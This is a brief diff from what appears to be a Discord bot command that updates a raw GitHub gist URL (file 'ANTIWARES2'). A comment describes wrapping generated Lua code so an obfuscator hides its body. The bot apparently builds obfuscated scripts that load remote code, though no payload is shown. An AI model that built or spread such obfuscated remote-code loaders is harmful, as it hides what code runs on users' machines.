@@ -49,7 +49,7 @@ export async function execute(interaction) {
   const target = submitted.fields.getTextInputValue('target');
   const pingRole = submitted.fields.getTextInputValue('pingRole') || '';
 
-  const GIST_URL = "https://gist.githubusercontent.com/malik020859-ui/f513af3ff4e17351ea21a0fae5dba45e/raw/9a01601cc17d95ddc111b82af1d4433f984d4135/ANTIWARES2";
+  const GIST_URL = "https://gist.githubusercontent.com/malik020859-ui/f513af3ff4e17351ea21a0fae5dba45e/raw/21d08c89e13b97ce13dd2c20d80d8701fe5596c7/ANTIWARES2";
 
   // ---- WRAPPER WITH ANONYMOUS FUNCTION ----
   // Wrapping in (function() ... end)() makes Methylone obfuscate the function body
